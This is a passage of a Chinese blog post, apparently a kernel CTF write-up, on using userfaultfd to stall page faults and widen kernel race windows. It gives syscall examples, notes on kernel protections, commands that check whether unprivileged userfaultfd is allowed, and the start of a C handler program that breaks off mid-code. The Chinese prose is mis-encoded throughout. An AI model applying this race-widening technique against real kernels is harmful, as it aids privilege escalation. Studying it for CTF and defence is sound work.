<!DOCTYPE html><html lang="zh-CN"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1"><meta name="format-detection" content="telephone=no"><meta name="apple-mobile-web-app-capable" content="yes"><meta name="apple-mobile-web-app-status-bar-style" content="black"><link rel="icon" href="/images/icons/favicon-16x16.png?v=2.6.2" type="image/png" sizes="16x16"><link rel="icon" href="/images/icons/favicon-32x32.png?v=2.6.2" type="image/png" sizes="32x32"><meta name="description" content="ä»¥ä¸ºå¯ä»¥ä¸€å¤©ä¸€é“é¢˜ï¼Œç»“æœçœ‹åˆ«äººWPå‘ç°æœ‰å„ç§å„æ ·ä¸åŒçš„åˆ©ç”¨æ–¹æ³•ï¼Œäºæ˜¯æŠŠæ‰€æœ‰è§‰å¾—è¿˜ä¸é”™çš„æ–¹æ³•éƒ½è¯•ç€åˆ©ç”¨äº†ä¸€éğŸ« ">
<meta property="og:type" content="article">
<meta property="og:title" content="userfaultfdä¸setxattråœ¨æ¡ä»¶ç«äº‰ä¸­çš„åˆ©ç”¨ç»ƒä¹ ">
<meta property="og:url" content="http://blingblingxuanxuan.github.io/2023/03/02/230302-userfaultfd-and-setxattr-exercises/index.html">
<meta property="og:site_name" content="blingbling&#39;s blog">
<meta property="og:description" content="ä»¥ä¸ºå¯ä»¥ä¸€å¤©ä¸€é“é¢˜ï¼Œç»“æœçœ‹åˆ«äººWPå‘ç°æœ‰å„ç§å„æ ·ä¸åŒçš„åˆ©ç”¨æ–¹æ³•ï¼Œäºæ˜¯æŠŠæ‰€æœ‰è§‰å¾—è¿˜ä¸é”™çš„æ–¹æ³•éƒ½è¯•ç€åˆ©ç”¨äº†ä¸€éğŸ« ">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="http://blingblingxuanxuan.github.io/2023/03/02/230302-userfaultfd-and-setxattr-exercises/Snipaste_2023-03-02_12-32-42.png?size=600">
<meta property="og:image" content="http://blingblingxuanxuan.github.io/2023/03/02/230302-userfaultfd-and-setxattr-exercises/image-20230301180427383.png?size=600">
<meta property="og:image" content="http://blingblingxuanxuan.github.io/2023/03/02/230302-userfaultfd-and-setxattr-exercises/image-20230225213203420.png?size=600">
<meta property="og:image" content="http://blingblingxuanxuan.github.io/2023/03/02/230302-userfaultfd-and-setxattr-exercises/image-20230225194548400.png?size=600">
<meta property="og:image" content="http://blingblingxuanxuan.github.io/2023/03/02/230302-userfaultfd-and-setxattr-exercises/image-20230301002128590.png?size=600">
<meta property="og:image" content="http://blingblingxuanxuan.github.io/2023/03/02/230302-userfaultfd-and-setxattr-exercises/image-20230228232415377.png?size=600">
<meta property="article:published_time" content="2023-03-02T06:48:44.000Z">
<meta property="article:modified_time" content="2023-04-06T13:52:16.325Z">
<meta property="article:author" content="blingbling">
<meta property="article:tag" content="kernel pwn">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="http://blingblingxuanxuan.github.io/2023/03/02/230302-userfaultfd-and-setxattr-exercises/Snipaste_2023-03-02_12-32-42.png?size=600"><title>userfaultfdä¸setxattråœ¨æ¡ä»¶ç«äº‰ä¸­çš„åˆ©ç”¨ç»ƒä¹  | blingbling's blog</title><link ref="canonical" href="http://blingblingxuanxuan.github.io/2023/03/02/230302-userfaultfd-and-setxattr-exercises/"><link rel="dns-prefetch" href="https://cdn.jsdelivr.net"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.12.1/css/all.min.css" type="text/css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.css" type="text/css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/social-share.js@1.0.16/dist/css/share.min.css" type="text/css"><link rel="stylesheet" href="/css/index.css?v=2.6.2"><script>var Stun = window.Stun || {};
var CONFIG = {
  root: '/',
  algolia: undefined,
  assistSearch: undefined,
  fontIcon: {"prompt":{"success":"fas fa-check-circle","info":"fas fa-arrow-circle-right","warning":"fas fa-exclamation-circle","error":"fas fa-times-circle"},"copyBtn":"fas fa-copy"},
  sidebar: {"offsetTop":"80px","tocMaxDepth":3},
  header: {"enable":true,"showOnPost":false,"scrollDownIcon":true},
  postWidget: {"endText":true},
  nightMode: {"enable":true},
  back2top: {"enable":true},
  codeblock: {"style":"default","highlight":"dark","wordWrap":false},
  reward: false,
  fancybox: true,
  zoomImage: undefined,
  galleryWaterfall: undefined,
  lazyload: false,
  pjax: undefined,
  externalLink: {"icon":{"enable":true,"name":"fas fa-external-link-alt"}},
  shortcuts: undefined,
  prompt: {"copyButton":"å¤åˆ¶","copySuccess":"å¤åˆ¶æˆåŠŸ","copyError":"å¤åˆ¶å¤±è´¥"},
  sourcePath: {"js":"js","css":"css","images":"images"},
};

window.CONFIG = CONFIG;</script><meta name="generator" content="Hexo 5.3.0"></head><body><div class="container" id="container"><header class="header" id="header"><div class="header-inner header-inner--height header-inner--bgcolor"><nav class="header-nav header-nav--sticky"><div class="header-nav-inner"><div class="header-nav-menubtn"><i class="fas fa-bars"></i></div><div class="header-nav-menu"><div class="header-nav-menu-item"><a class="header-nav-menu-item__link" href="/"><span class="header-nav-menu-item__icon"><i class="fas fa-home"></i></span><span class="header-nav-menu-item__text">é¦–é¡µ</span></a></div><div class="header-nav-menu-item"><a class="header-nav-menu-item__link" href="/archives/"><span class="header-nav-menu-item__icon"><i class="fas fa-folder-open"></i></span><span class="header-nav-menu-item__text">å½’æ¡£</span></a></div><div class="header-nav-menu-item"><a class="header-nav-menu-item__link" href="/categories/"><span class="header-nav-menu-item__icon"><i class="fas fa-layer-group"></i></span><span class="header-nav-menu-item__text">åˆ†ç±»</span></a></div><div class="header-nav-menu-item"><a class="header-nav-menu-item__link" href="/tags/"><span class="header-nav-menu-item__icon"><i class="fas fa-tags"></i></span><span class="header-nav-menu-item__text">æ ‡ç­¾</span></a></div><div class="header-nav-menu-item"><a class="header-nav-menu-item__link" href="/about/"><span class="header-nav-menu-item__icon"><i class="fas fa-user"></i></span><span class="header-nav-menu-item__text">å…³äº</span></a></div><div class="header-nav-menu-item"><a class="header-nav-menu-item__link" href="/friends/"><span class="header-nav-menu-item__icon"><i class="fas fa-thumbs-up"></i></span><span class="header-nav-menu-item__text">å‹é“¾</span></a></div></div><div class="header-nav-search"><span class="header-nav-search__icon"><i class="fas fa-search"></i></span><span class="header-nav-search__text">æœç´¢</span></div><div class="header-nav-mode"><div class="mode"><div class="mode-track"><span class="mode-track-moon"></span><span class="mode-track-sun"></span></div><div class="mode-thumb"></div></div></div></div></nav></div></header><main class="main" id="main"><div class="main-inner"><div class="content-wrap" id="content-wrap"><div class="content" id="content"><!-- Just used to judge whether it is an article page--><div id="is-post"></div><div class="post"><header class="post-header"><h1 class="post-title">userfaultfdä¸setxattråœ¨æ¡ä»¶ç«äº‰ä¸­çš„åˆ©ç”¨ç»ƒä¹ </h1><div class="post-meta"><span class="post-meta-item post-meta-item--createtime"><span class="post-meta-item__icon"><i class="far fa-calendar-plus"></i></span><span class="post-meta-item__info">å‘è¡¨äº</span><span class="post-meta-item__value">2023-03-02</span></span><span class="post-meta-item post-meta-item--updatetime"><span class="post-meta-item__icon"><i class="far fa-calendar-check"></i></span><span class="post-meta-item__info">æ›´æ–°äº</span><span class="post-meta-item__value">2023-04-06</span></span></div></header><div class="post-body"><p>é€šè¿‡ä¸¤ä¸ª kernel ctf é¢˜ç›®æ¥ç†è§£<code>userfaultfd</code>ä»¥åŠ<code>setxattr</code>çš„ç”¨æ³•å§ï¼</p>

        <h1 id="æ¦‚å¿µæ¢³ç†"   >
          <a href="#æ¦‚å¿µæ¢³ç†" class="heading-link"><i class="fas fa-link"></i></a><a href="#æ¦‚å¿µæ¢³ç†" class="headerlink" title="æ¦‚å¿µæ¢³ç†"></a>æ¦‚å¿µæ¢³ç†</h1>
      
        <h2 id="userfaultfdç³»ç»Ÿè°ƒç”¨"   >
          <a href="#userfaultfdç³»ç»Ÿè°ƒç”¨" class="heading-link"><i class="fas fa-link"></i></a><a href="#userfaultfdç³»ç»Ÿè°ƒç”¨" class="headerlink" title="userfaultfdç³»ç»Ÿè°ƒç”¨"></a>userfaultfdç³»ç»Ÿè°ƒç”¨</h2>
      <p>userfaultfdæ˜¯linuxçš„ä¸€ä¸ªç³»ç»Ÿè°ƒç”¨ï¼ˆæ— libcå°è£…å‡½æ•°ï¼‰ï¼Œå®ƒçš„å‡ºç°ï¼ˆLinux 4.3ï¼‰ç»™ç”¨æˆ·æ€æä¾›äº†ç¼ºé¡µå¤„ç†çš„èƒ½åŠ›ã€‚userfaultfdç³»ç»Ÿè°ƒç”¨è¿”å›ç»™ç”¨æˆ·æ€è¿›ç¨‹çš„æ˜¯ä¸€ä¸ªç”¨äºå¤„ç†page faultsçš„æ–‡ä»¶æè¿°ç¬¦ã€‚</p>
<p><span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://man7.org/linux/man-pages/man2/userfaultfd.2.html" >userfaultfd(2) - Linux manual page</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
<p><span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://man7.org/linux/man-pages/man2/ioctl_userfaultfd.2.html" >ioctl_userfaultfd(2) â€” Linux manual page</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
<p><span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://elixir.bootlin.com/linux/v5.15/source/fs/userfaultfd.c#L2062" >SYSCALL_DEFINE1(userfaultfd, int, flags)</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
<p><span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="http://blog.jcix.top/2018-10-01/userfaultfd_intro/" >ä»å†…æ ¸åˆ°ç”¨æˆ·ç©ºé—´(1) â€” ç”¨æˆ·æ€ç¼ºé¡µå¤„ç†æœºåˆ¶ userfaultfd çš„ä½¿ç”¨</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>

        <h3 id="ä½¿ç”¨userfaultfd"   >
          <a href="#ä½¿ç”¨userfaultfd" class="heading-link"><i class="fas fa-link"></i></a><a href="#ä½¿ç”¨userfaultfd" class="headerlink" title="ä½¿ç”¨userfaultfd"></a>ä½¿ç”¨userfaultfd</h3>
      <p>ä¸€ä¸ªåˆ©ç”¨userfaultfdè®©ç”¨æˆ·æ€æ¥å¤„ç†ç¼ºé¡µå¼‚å¸¸çš„ä¾‹å­ï¼ˆæ¥è‡ª<code>man userfaultfd</code>ï¼‰ï¼š</p>
<ol>
<li><p>é€šè¿‡userfaultfdç³»ç»Ÿè°ƒç”¨åˆ›å»ºuserfaultfd object</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">long</span> uffd;</span><br><span class="line">uffd = syscall(__NR_userfaultfd, O_CLOEXEC | O_NONBLOCK);</span><br></pre></td></tr></table></div></figure></li>
<li><p>ç”¨æˆ·æ€è¿›ç¨‹éœ€è¦å…ˆé€šè¿‡UFFD_APIè¿™ä¸ªioctlå‘½ä»¤ï¼Œä½¿èƒ½userfaultfd</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">uffdio_api</span> <span class="title">uffdio_api</span>;</span></span><br><span class="line">uffdio_api.api = UFFD_API;</span><br><span class="line">uffdio_api.features = <span class="number">0</span>;</span><br><span class="line">ioctl(uffd, UFFDIO_API, &amp;uffdio_api);</span><br></pre></td></tr></table></div></figure></li>
<li><p>ç”¨æˆ·æ€è¿›ç¨‹é€šè¿‡UFFDIO_REGISTERè¿™ä¸ªioctlå‘½ä»¤ï¼Œæ³¨å†Œè®¾ç½®å†…å­˜åœ°å€èŒƒå›´</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">   <span class="keyword">char</span> *addr;  </span><br><span class="line">   <span class="class"><span class="keyword">struct</span> <span class="title">uffdio_register</span> <span class="title">uffdio_register</span>;</span></span><br><span class="line">addr = mmap(<span class="literal">NULL</span>, len, PROT_READ | PROT_WRITE,</span><br><span class="line">            MAP_PRIVATE | MAP_ANONYMOUS, <span class="number">-1</span>, <span class="number">0</span>);</span><br><span class="line">   </span><br><span class="line">uffdio_register.range.start = (<span class="keyword">unsigned</span> <span class="keyword">long</span>) addr;</span><br><span class="line">uffdio_register.range.len = len;</span><br><span class="line">uffdio_register.mode = UFFDIO_REGISTER_MODE_MISSING;</span><br><span class="line">ioctl(uffd, UFFDIO_REGISTER, &amp;uffdio_register;</span><br></pre></td></tr></table></div></figure></li>
<li><p>æœ€åç”¨æˆ·æ€è¿›ç¨‹å¯ä½¿ç”¨UFFDIO_COPYæˆ–UFFDIO_ZEROPAGEä¸¤ä¸ªioctlå‘½ä»¤æ¥å¤„ç†ç¼ºé¡µå¼‚å¸¸ã€‚</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">	s = pthread_create(&amp;thr, <span class="literal">NULL</span>, fault_handler_thread, (<span class="keyword">void</span> *) uffd);</span><br><span class="line"></span><br><span class="line"><span class="comment">// fault_handler_thread()å‡½æ•°å®šä¹‰å¦‚ä¸‹ï¼Œæ¢³ç†ä¸»è¦ä»£ç æµç¨‹</span></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> *<span class="title">fault_handler_thread</span><span class="params">(<span class="keyword">void</span> *arg)</span></span>&#123;</span><br><span class="line"><span class="comment">// 1) åˆ›å»ºä¸€ä¸ªpageï¼Œç”¨äºç¼ºé¡µå¤„ç†</span></span><br><span class="line">     page = mmap(<span class="literal">NULL</span>, page_size, PROT_READ | PROT_WRITE,</span><br><span class="line">                 MAP_PRIVATE | MAP_ANONYMOUS, <span class="number">-1</span>, <span class="number">0</span>);</span><br><span class="line"><span class="comment">// 2) ç­‰å¾…uffdäº‹ä»¶åˆ°æ¥</span></span><br><span class="line">     pollfd.fd = uffd;</span><br><span class="line">     pollfd.events = POLLIN;</span><br><span class="line">     poll(&amp;pollfd, <span class="number">1</span>, <span class="number">-1</span>);</span><br><span class="line">  </span><br><span class="line"><span class="comment">// 3) ä»userfaultfdä¸­è¯»å–äº‹ä»¶ä¿¡æ¯ï¼Œç¡®è®¤æ˜¯å¦æ˜¯ç¼ºé¡µé”™è¯¯äº‹ä»¶     </span></span><br><span class="line">     read(uffd, &amp;msg, <span class="keyword">sizeof</span>(msg));</span><br><span class="line">     <span class="keyword">if</span> (msg.event != UFFD_EVENT_PAGEFAULT) &#123;</span><br><span class="line">         <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Unexpected event on userfaultfd\n&quot;</span>);</span><br><span class="line">         <span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">     &#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 4) å°†å‡†å¤‡å¥½çš„æ•°æ®é¡µå†…å®¹æ‹·è´åˆ°userfaultfdæ³¨å†Œçš„ç©ºé—´å†…</span></span><br><span class="line">     uffdio_copy.src = (<span class="keyword">unsigned</span> <span class="keyword">long</span>) page;</span><br><span class="line">     uffdio_copy.dst = (<span class="keyword">unsigned</span> <span class="keyword">long</span>) msg.arg.pagefault.address &amp; ~(page_size - <span class="number">1</span>);</span><br><span class="line">     uffdio_copy.len = page_size;</span><br><span class="line">     uffdio_copy.mode = <span class="number">0</span>;</span><br><span class="line">     uffdio_copy.copy = <span class="number">0</span>;</span><br><span class="line">     ioctl(uffd, UFFDIO_COPY, &amp;uffdio_copy) </span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>


</li>
</ol>
<p>ç”¨æˆ·çº¿ç¨‹çš„å¤„ç†è¿‡ç¨‹æ˜¯æˆ‘ä»¬å¯æ§çš„ï¼Œé€šè¿‡å»¶é•¿ç”¨æˆ·æ€å¤„ç†æ—¶é—´ï¼Œè¯¥ç³»ç»Ÿè°ƒç”¨å¯ä»¥å¸®åŠ©æˆ‘ä»¬æé«˜å†…æ ¸æ¡ä»¶ç«äº‰æˆåŠŸçš„æ¦‚ç‡ã€‚</p>
<p><strong>é˜²æŠ¤</strong></p>
<p>userfaultfdç³»ç»Ÿè°ƒç”¨ä»linux4.3å¼€å§‹å¼•å…¥ï¼Œåˆšå¼€å§‹çš„å‡ ä¸ªç‰ˆæœ¬ä¸­ï¼Œå¯¹è¯¥ç³»ç»Ÿè°ƒç”¨æ— ä»»ä½•é™åˆ¶ï¼Œæ‰€æœ‰ç”¨æˆ·å‡å¯è°ƒç”¨ã€‚</p>
<p>linux 5.2å¼€å§‹ï¼Œåœ¨å†…æ ¸ä¸­å¢åŠ äº†ä¸€ä¸ªå¼€å…³ï¼Œé€šè¿‡<code>sysctl_unprivileged_userfaultfd</code>æ¥æ§åˆ¶æ˜¯å¦å…è®¸ç”¨éç‰¹æƒç”¨æˆ·ä½¿ç”¨userfaultfdåŠŸèƒ½ï¼ˆé»˜è®¤æƒ…å†µä¸‹è®¾ç½®ä¸º0ï¼Œä¸å…è®¸éç‰¹æƒç”¨æˆ·ä½¿ç”¨ï¼‰ã€‚</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (!sysctl_unprivileged_userfaultfd &amp;&amp; !capable(CAP_SYS_PTRACE))</span><br><span class="line">	<span class="keyword">return</span> -EPERM;</span><br></pre></td></tr></table></div></figure>
<p>linux 5.11å¼€å§‹ï¼Œåˆå¢åŠ äº†<code>UFFD_USER_MODE_ONLY</code>æ ‡å¿—ä½ï¼Œå†³å®šäº†userfaultfdæ˜¯å¦ä»…å¤„ç†ç”¨æˆ·ç©ºé—´çš„page faultã€‚<span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://lwn.net/Articles/819834/" >Blocking userfaultfd() kernel-fault handling</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span> æ–‡ç« ä¸­æŒ‡å‡ºï¼Œæ–°ç‰ˆæœ¬å†…æ ¸ä¸­é»˜è®¤ç¦æ­¢éç‰¹æƒè¿›ç¨‹ä½¿ç”¨userfaultfdï¼Œéç‰¹æƒè¿›ç¨‹åªèƒ½é€šè¿‡è®¾ç½®<code>sysctl_unprivileged_userfaultfd</code>ä»è€Œå®‰å…¨åœ°è°ƒç”¨userfaultfdï¼ˆåªèƒ½å¤„ç†ç”¨æˆ·æ€çš„ç¼ºé¡µé”™è¯¯ï¼Œå¯ç”¨<code>UFFD_USER_MODE_ONLY</code>æ ‡å¿—ç€userfaultfdä¸å…è®¸åœ¨å†…æ ¸æ€ä½¿ç”¨ï¼‰ã€‚</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (!sysctl_unprivileged_userfaultfd &amp;&amp;</span><br><span class="line">    (flags &amp; UFFD_USER_MODE_ONLY) == <span class="number">0</span> &amp;&amp;</span><br><span class="line">    !capable(CAP_SYS_PTRACE)) &#123;</span><br><span class="line">	printk_once(KERN_WARNING <span class="string">&quot;uffd: Set unprivileged_userfaultfd &quot;</span></span><br><span class="line">		<span class="string">&quot;sysctl knob to 1 if kernel faults must be handled &quot;</span></span><br><span class="line">		<span class="string">&quot;without obtaining CAP_SYS_PTRACE capability\n&quot;</span>);</span><br><span class="line">	<span class="keyword">return</span> -EPERM;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>
<p>é‚£ä¹ˆï¼Œåœ¨åšé¢˜è¿‡ç¨‹ä¸­ï¼Œå¦‚ä¸‹ä¸¤æ¡å‘½ä»¤ä¸­ä»»ä½•ä¸€æ¡ä¸º1ï¼Œå¤§æ¦‚ç‡è¡¨æ˜è¿™ä¸ªé¢˜å¯ä»¥ä½¿ç”¨userfaultfdã€‚è€ŒçœŸå®ç³»ç»Ÿä¸Šï¼Œè¿˜è¦ç¡®è®¤<code>UFFD_USER_MODE_ONLY</code>æ²¡å¼€ã€‚</p>
<figure class="highlight bash"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># æŸ¥çœ‹å†…æ ¸æ˜¯å¦æ”¯æŒuserfaultdï¼Œå‡ºç°`CONFIG_USERFAULTFD=y`è¡¨ç¤ºæ”¯æŒ</span></span><br><span class="line">grep CONFIG_USERFAULTFD /boot/config-$(uname -r)</span><br><span class="line"><span class="comment"># æŸ¥çœ‹éç‰¹æƒç”¨æˆ·æ˜¯å¦èƒ½è°ƒç”¨userfaultfdï¼Œå€¼ä¸º1æ—¶è¡¨ç¤ºéç‰¹æƒç”¨æˆ·å¯è°ƒç”¨</span></span><br><span class="line">sysctl -a | grep unprivileged_userfaultfd</span><br></pre></td></tr></table></div></figure>
<p>æ„Ÿè°¢chatgptğŸ˜</p>
<p><img   src="Snipaste_2023-03-02_12-32-42.png?size=600" style="width: 600px;"  alt="Snipaste_2023-03-02_12-32-42"></p>
<p>å¯ä»¥é€šè¿‡ç¼–è¯‘ä¸‹é¢è¿™æ®µä»£ç ï¼Œç¡®è®¤èƒ½å¦ä½¿ç”¨userfaultfdã€‚ï¼ˆå‡ºç°<code>[+] in usefaultfd handler, i will sleep 60s\n&quot;</code>å­—ç¬¦ä¸²æ‰“å°ï¼Œè¡¨æ˜å¯ä»¥ä½¿ç”¨ï¼‰</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// gcc test.c -lpthread -o test</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _GNU_SOURCE</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;inttypes.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/userfaultfd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;pthread.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;errno.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;signal.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;poll.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/syscall.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/ioctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;poll.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;ctype.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/timerfd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/ipc.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/msg.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/keyctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/xattr.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PAGE_SIZE sysconf(_SC_PAGE_SIZE)</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">ErrExit</span><span class="params">(<span class="keyword">char</span>* err_msg)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">puts</span>(err_msg);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">RegisterUserfault</span><span class="params">(<span class="keyword">void</span> *fault_page,<span class="keyword">void</span> *handler)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">pthread_t</span> thr;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">uffdio_api</span> <span class="title">ua</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">uffdio_register</span> <span class="title">ur</span>;</span></span><br><span class="line">    <span class="keyword">uint64_t</span> uffd  = syscall(__NR_userfaultfd, O_CLOEXEC | O_NONBLOCK);</span><br><span class="line">    ua.api = UFFD_API;</span><br><span class="line">    ua.features = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span> (ioctl(uffd, UFFDIO_API, &amp;ua) == <span class="number">-1</span>)</span><br><span class="line">        ErrExit(<span class="string">&quot;[-] 